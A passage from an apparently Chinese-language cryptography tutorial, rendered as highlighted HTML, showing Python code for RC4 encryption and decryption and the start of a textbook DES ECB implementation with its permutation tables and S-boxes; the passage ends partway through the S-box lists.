    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        S.append(i)
        tmp.append(Key[i % <span class="hljs-built_in">len</span>(Key)])
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):
        j = (j + S[i] + <span class="hljs-built_in">ord</span>(tmp[i])) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]             <span class="hljs-comment"># 交换S[i],S[j]</span>

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Encode</span>(<span class="hljs-params">S, plaintext</span>):</span>
    i = j = <span class="hljs-number">0</span>
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> plaintext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])
        result += k
    result = base64.b64encode(result.encode(<span class="hljs-string">&#x27;UTF-8&#x27;</span>))
    result = result.decode()
    <span class="hljs-keyword">return</span> result


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rc4_Decode</span>(<span class="hljs-params">S, criphtext</span>):</span>
    i = j = <span class="hljs-number">0</span>
    criphtext = base64.b64decode(criphtext)
    criphtext = <span class="hljs-built_in">str</span>(criphtext.decode())
    result = <span class="hljs-string">&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> criphtext:
        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>
        j = (j + S[i]) % <span class="hljs-number">256</span>
        S[i], S[j] = S[j], S[i]
        t = (S[i] + S[j]) % <span class="hljs-number">256</span>
        k = <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(a) ^ S[t])
        result += k
    <span class="hljs-keyword">return</span> result

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span>
    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
        order = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入指令,加密/E,解密/D :&quot;</span>)
        <span class="hljs-keyword">if</span> order.upper() ==<span class="hljs-string">&#x27;E&#x27;</span>:
            plaintext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;请输入明文: &#x27;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥: &quot;</span>)
            s = []
            Rc4_init(s, key)
            cryphtext = rc4_Encode(s, plaintext)
            print(<span class="hljs-string">&quot;密文为: &quot;</span>, cryphtext)
            print(<span class="hljs-string">&#x27;\n&#x27;</span>)

        <span class="hljs-keyword">else</span>:
            cryphtext = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文: &quot;</span>)
            key = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥: &quot;</span>)
            s = []
            Rc4_init(s, key)
            plaintext = rc4_Decode(s, cryphtext)
            print(<span class="hljs-string">&quot;明文为: &quot;</span>, plaintext)
            print(<span class="hljs-string">&#x27;\n&#x27;</span>)
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:
    main()</code></pre>



<h1 id="三、DES"><a href="#三、DES" class="headerlink" title="三、DES"></a>三、DES</h1><p>DEC_ECB模式</p>
<pre><code class="hljs python"><span class="hljs-comment"># 两字符进行异或运算</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">xor</span>(<span class="hljs-params">str1, str2</span>):</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(str1)):
        xor_res = <span class="hljs-built_in">int</span>(str1[i], <span class="hljs-number">10</span>)^<span class="hljs-built_in">int</span>(str2[i], <span class="hljs-number">10</span>)
        <span class="hljs-keyword">if</span> xor_res == <span class="hljs-number">1</span>:
            res += <span class="hljs-string">&#x27;1&#x27;</span>
        <span class="hljs-keyword">else</span>:
            res += <span class="hljs-string">&#x27;0&#x27;</span>
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># 处理字符串，将每个字符串都转成八位二进制数</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_process</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:
        tmp = <span class="hljs-built_in">bin</span>(<span class="hljs-built_in">ord</span>(i))[<span class="hljs-number">2</span>:]
        tmp = (<span class="hljs-number">8</span> - <span class="hljs-built_in">len</span>(tmp)) * <span class="hljs-string">&#x27;0&#x27;</span> + tmp  <span class="hljs-comment"># 不够八位则在前面补 0</span>
        res += tmp
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-1盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_1</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    change_table = [<span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                 <span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,
                 <span class="hljs-number">2</span>,<span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,
                 <span class="hljs-number">3</span>,<span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,
                 <span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,
                 <span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,
                 <span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># PC-2盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_change_2</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    change_table = [<span class="hljs-number">14</span>,<span class="hljs-number">17</span>,<span class="hljs-number">11</span>,<span class="hljs-number">24</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">28</span>,
                 <span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">21</span>,<span class="hljs-number">10</span>,<span class="hljs-number">23</span>,<span class="hljs-number">19</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                 <span class="hljs-number">26</span>,<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,<span class="hljs-number">7</span>,<span class="hljs-number">27</span>,<span class="hljs-number">20</span>,<span class="hljs-number">13</span>,<span class="hljs-number">2</span>,
                 <span class="hljs-number">41</span>,<span class="hljs-number">52</span>,<span class="hljs-number">31</span>,<span class="hljs-number">37</span>,<span class="hljs-number">47</span>,<span class="hljs-number">55</span>,<span class="hljs-number">30</span>,<span class="hljs-number">40</span>,
                 <span class="hljs-number">51</span>,<span class="hljs-number">45</span>,<span class="hljs-number">33</span>,<span class="hljs-number">48</span>,<span class="hljs-number">44</span>,<span class="hljs-number">49</span>,<span class="hljs-number">39</span>,<span class="hljs-number">56</span>,
                 <span class="hljs-number">34</span>,<span class="hljs-number">53</span>,<span class="hljs-number">46</span>,<span class="hljs-number">42</span>,<span class="hljs-number">50</span>,<span class="hljs-number">36</span>,<span class="hljs-number">29</span>,<span class="hljs-number">32</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># 循环左移</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">left_run</span>(<span class="hljs-params"><span class="hljs-built_in">str</span>, num</span>):</span>
    tmp_str = <span class="hljs-built_in">str</span>[num:<span class="hljs-built_in">len</span>(<span class="hljs-built_in">str</span>)]
    tmp_str = tmp_str+<span class="hljs-built_in">str</span>[<span class="hljs-number">0</span>:num]
    <span class="hljs-keyword">return</span> tmp_str


<span class="hljs-comment"># 生成16个子密钥</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">key_gen</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    key_list = []
    key_change_res = key_change_1(<span class="hljs-built_in">str</span>)
    key_c = key_change_res[<span class="hljs-number">0</span>:<span class="hljs-number">28</span>]
    key_d = key_change_res[<span class="hljs-number">28</span>:]
    num = [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>]
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>): <span class="hljs-comment">#共16轮</span>
        key_c = left_run(key_c, num[i])
        key_d = left_run(key_d, num[i])
        key_yiwei = key_c + key_d
        key_res = key_change_2(key_yiwei)
        key_list.append(key_res)
    <span class="hljs-keyword">return</span> key_list

<span class="hljs-comment"># IP盒处理</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">begin_change</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    change_table = [<span class="hljs-number">58</span>,<span class="hljs-number">50</span>,<span class="hljs-number">42</span>,<span class="hljs-number">34</span>,<span class="hljs-number">26</span>,<span class="hljs-number">18</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,
                   <span class="hljs-number">60</span>,<span class="hljs-number">52</span>,<span class="hljs-number">44</span>,<span class="hljs-number">36</span>,<span class="hljs-number">28</span>,<span class="hljs-number">20</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,
                   <span class="hljs-number">62</span>,<span class="hljs-number">54</span>,<span class="hljs-number">46</span>,<span class="hljs-number">38</span>,<span class="hljs-number">30</span>,<span class="hljs-number">22</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,
                   <span class="hljs-number">64</span>,<span class="hljs-number">56</span>,<span class="hljs-number">48</span>,<span class="hljs-number">40</span>,<span class="hljs-number">32</span>,<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,
                   <span class="hljs-number">57</span>,<span class="hljs-number">49</span>,<span class="hljs-number">41</span>,<span class="hljs-number">33</span>,<span class="hljs-number">25</span>,<span class="hljs-number">17</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,
                   <span class="hljs-number">59</span>,<span class="hljs-number">51</span>,<span class="hljs-number">43</span>,<span class="hljs-number">35</span>,<span class="hljs-number">27</span>,<span class="hljs-number">19</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,
                   <span class="hljs-number">61</span>,<span class="hljs-number">53</span>,<span class="hljs-number">45</span>,<span class="hljs-number">37</span>,<span class="hljs-number">29</span>,<span class="hljs-number">21</span>,<span class="hljs-number">13</span>,<span class="hljs-number">5</span>,
                   <span class="hljs-number">63</span>,<span class="hljs-number">55</span>,<span class="hljs-number">47</span>,<span class="hljs-number">39</span>,<span class="hljs-number">31</span>,<span class="hljs-number">23</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res


<span class="hljs-comment"># E盒处理  32位-&gt;48位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">E_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    change_table = [<span class="hljs-number">32</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,
                    <span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,
                    <span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,
                    <span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,
                    <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span>,<span class="hljs-number">27</span>,
                    <span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">28</span>,<span class="hljs-number">29</span>,<span class="hljs-number">30</span>,<span class="hljs-number">31</span>,<span class="hljs-number">32</span>,<span class="hljs-number">1</span>]
    res = <span class="hljs-string">&quot;&quot;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> change_table:
        res += <span class="hljs-built_in">str</span>[i-<span class="hljs-number">1</span>]
    <span class="hljs-keyword">return</span> res

<span class="hljs-comment"># s盒处理   48位-&gt;32位</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">S_box</span>(<span class="hljs-params"><span class="hljs-built_in">str</span></span>):</span>
    j = <span class="hljs-number">0</span>
    s_list = [[<span class="hljs-number">14</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">3</span>,<span class="hljs-number">10</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">12</span>,<span class="hljs-number">8</span>,<span class="hljs-number">2</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">13</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">15</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>],
              [<span class="hljs-number">10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">11</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">14</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>],
              [<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">11</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0</span>,<span class="hljs-number">12</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">15</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">14</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">6</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>],
              [<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>,<span class="hljs-number">15</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">4</span>,<span class="hljs-number">7</span>,<span class="hljs-number">13</span>,<span class="hljs-number">1</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">3</span>,<span class="hljs-number">9</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">13</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">14</span>,<span class="hljs-number">11</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">7</span>,<span class="hljs-number">1</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">13</span>,<span class="hljs-number">6</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">3</span>],
              [<span class="hljs-number">12</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">14</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">11</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-number">7</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">3</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">5</span>,<span class="hljs-number">2</span>,<span class="hljs-number">8</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">11</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>,<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">15</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">14</span>,<span class="hljs-number">1</span>,<span class="hljs-number">7</span>,<span class="hljs-number">6</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>],
              [<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">2</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,<span class="hljs-number">13</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">9</span>,<span class="hljs-number">7</span>,<span class="hljs-number">5</span>,<span class="hljs-number">10</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">13</span>,<span class="hljs-number">0</span>,<span class="hljs-number">11</span>,<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-number">9</span>,<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">14</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">12</span>,<span class="hljs-number">2</span>,<span class="hljs-number">15</span>,<span class="hljs-number">8</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">12</span>,<span class="hljs-number">3</span>,<span class="hljs-number">7</span>,<span class="hljs-number">14</span>,<span class="hljs-number">10</span>,<span class="hljs-number">15</span>,<span class="hljs-number">6</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>,<span class="hljs-number">9</span>,<span class="hljs-number">2</span>,<span class="hljs-number">6</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>,<span class="hljs-number">8</span>,<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-number">10</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>,<span class="hljs-number">5</span>,<span class="hljs-number">0</span>,<span class="hljs-number">15</span>,<span class="hljs-number">14</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">12</span>],
